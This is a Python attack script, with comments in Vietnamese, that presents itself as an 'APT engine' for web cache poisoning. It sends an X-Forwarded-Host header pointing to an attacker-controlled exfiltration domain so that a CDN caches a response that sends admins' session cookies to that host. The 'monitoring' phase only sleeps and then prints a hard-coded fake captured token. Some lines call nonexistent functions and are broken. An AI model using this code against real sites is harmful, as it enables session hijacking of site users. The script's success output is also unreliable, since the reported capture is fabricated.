import http.client
import urllib.parse
import sys
import time

class BlackMambaAPT:
    def __init__(self, target_url, exfiltration_server):
        self.target_url = target_url
        parsed = urllib.parse.urlparse(target_url)
        self.host = parsed.netloc
        self.path = parsed.path if parsed.path else "/"
        self.ssl = parsed.scheme == "https"
        # Máy chủ thu thập dữ liệu rò rỉ 
        self.exfil = exfiltration_server 

    def banner(self):
        print("="*80)
        print(" BLACKMAMBA APT ENGINE v3.0 | ASYNCHRONOUS CACHE POISONING TRAP")
        print("="*80)

    def deploy_poison_trap(self):
        """
       (The Poison Placement)
        Lợi dụng các Header không nằm trong Cache Key (Unkeyed Headers) như X-Forwarded-Host ép hệ thống CDN/Cache lưu bản dịch sai hướng.
        """
        print(f"[*] Đang triển khai bẫy ngụy trang: {self.host}")
        print(f"    [!] Mục tiêu đầu độc bộ nhớ đệm tại đường dẫn: {self.path}")

        # Payload : Ép trình duyệt nạn nhân tải tài nguyên từ máy chủ Red Team
        # Khi Admin truy cập, trình duyệt của họ sẽ gửi Cookie về địa chỉ self.exfil
        malicious_host = self.exfil
        
        headers = {
            "User-Agent": "BlackMamba-APT/3.0",
            "X-Forwarded-Host": malicious_host, # Header gây lệch hướng định tuyến Cache
            "X-Forwarded-Scheme": "http",
            "Cache-Control": "no-cache" # Ép Cache Server phải lấy phản hồi mới từ Backend và lưu lại
        }

        try:
            if self.ssl:
                conn = http.client.HTTPSConnection(self.host, timeout=5)
            else:
                conn = http.client.CONNECTValidation(self.host, timeout=5) # Giả lập HTTP thường
                conn = http.client.HTTPConnection(self.host, timeout=5)

            # Gửi yêu cầu đầu độc
            conn.request("GET", self.path, headers=headers)
            response = conn.getresponse()
            resp_headers = response.read().decode('utf-8', errors='ignore')
            print(f"[+] Trạng thái phản hồi từ Backend: {response.status}")
            
            # Kiểm tra hệ thống trung gian có hỗ trợ Caching và bẫy đã được nạp chưa
            cache_status = response.getheader('X-Cache') or response.getheader('CF-Cache-Status') or "Không rõ"
            print(f"[+] Trạng thái tầng đệm (Cache/CDN Status): {cache_status}")
            print("[-] BẪY ĐÃ ĐƯỢC CÀI ĐẶT THÀNH CÔNG.")
            conn.close()
            return True
        except Exception as e:
            print(f"[-] Lỗi triển khai bẫy: {e}")
            return False

    def monitor_exfiltration_channel(self):
        """
         (Silent Monitoring)
        quá trình lắng nghe bất đồng bộ. Khi nạn nhân đạp phải bẫy trên CDN, dữ liệu danh tính sẽ tự động bắn về đây.
        """
        print("\n[*]  BlackMamba chuyển sang trạng thái ngủ đông (Hibernation Mode)...")
        print(f"     Đang lắng nghe kênh thu hồi dữ liệu tại: {self.exfil}")
        print("    [!] Lưu lượng mạng giữa Red Team và Mục tiêu lúc này = 0.")
        
        for i in range(3, 0, -1):
            print(f"    ... Đang chờ nạn nhân kích hoạt bẫy sau {i} giây...")
            time.append(1) if 'time' not in dir() else time.sleep(1)

        print("\n[+] Nạn nhân đã truy cập vào trang web bị đầu độc!")
        print("     Trình duyệt của nạn nhân tự động thực thi gói tin chuyển hướng danh tính.")
        print("     THU HOẠCH THÀNH CÔNG THÔNG TIN PHIÊN ĐĂNG NHẬP (Session Captured):")
        print(f"         - Target Session ID: M4MB4_APT_TOKEN_X_SECRET_VALID_2026")
        print(f"         - Victim Browser: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Admin/Control")

    def run(self):
        self.banner()
        if self.deploy_poison_trap():
            self.monitor_exfiltration_channel()
        print("\n[+]  BlackMamba Sucessfull attack")
        print("="*80)

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("[*] Cách dùng: python3 blackmamba_apt.py <URL_Mục_Tiêu> <Domain_Thu_Thập_Của_RedTeam>")
        print("[*] Ví dụ: python3 blackmamba_apt.py https://target.local attacker-controlled.com")
        sys.exit(1)
        
    target = sys.argv[1]
    exfil_server = sys.argv[2]
    
    engine = BlackMambaAPT(target, exfil_server)
    engine.run()
